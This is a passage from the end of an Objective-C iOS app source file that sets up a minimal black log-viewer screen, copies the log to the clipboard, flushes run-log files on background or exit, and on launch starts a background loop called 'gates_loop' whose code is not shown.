    [gLogLock unlock];
    [UIPasteboard generalPasteboard].string = snapshot;
    [_copyButton setTitle:@"COPIED" forState:UIControlStateNormal];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [self->_copyButton setTitle:@"COPY" forState:UIControlStateNormal];
    });
}

@end

// 3.2 — black screen, raw log, nothing else.  No cards, no buttons, no
// gradient.  GATES runs by itself on launch; the log is the only surface.
@interface MinimalVC : UIViewController
@end

@implementation MinimalVC
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    UITextView *tv = [[UITextView alloc] initWithFrame:self.view.bounds];
    tv.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    tv.backgroundColor = [UIColor blackColor];
    tv.textColor = [UIColor colorWithRed:0.55 green:1.0 blue:0.60 alpha:1.0];
    tv.font = [UIFont fontWithName:@"Menlo" size:8.0] ?: [UIFont monospacedSystemFontOfSize:8.0 weight:UIFontWeightRegular];
    tv.editable = NO;
    tv.selectable = NO;
    tv.scrollEnabled = YES;
    tv.textContainerInset = UIEdgeInsetsMake(24, 4, 24, 4);
    tv.textContainer.lineFragmentPadding = 0;
    tv.alwaysBounceVertical = YES;
    tv.indicatorStyle = UIScrollViewIndicatorStyleWhite;
    [self.view addSubview:tv];
    gView = tv;

    set_phase(@"gates");
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool { gates_loop(); }
        set_phase(@"done");
    });
}

- (UIStatusBarStyle)preferredStatusBarStyle { return UIStatusBarStyleLightContent; }
- (BOOL)prefersStatusBarHidden { return NO; }
@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [[MinimalVC alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
}
- (void)applicationDidEnterBackground:(UIApplication *)app {
    [gLogLock lock];
    if (gRunFile) fflush(gRunFile);
    if (gRunFileTmp) fflush(gRunFileTmp);
    [gLogLock unlock];
}
- (void)applicationWillTerminate:(UIApplication *)app {
    [gLogLock lock];
    if (gRunFile) { fflush(gRunFile); fclose(gRunFile); gRunFile = NULL; }
    if (gRunFileTmp) { fflush(gRunFileTmp); fclose(gRunFileTmp); gRunFileTmp = NULL; }
    [gLogLock unlock];
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        gLog = [NSMutableString string];
        gLogLock = [[NSLock alloc] init];
        gPhase = @"launch";
        run_setup();          // folder + run.log exist before any UI or probe
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
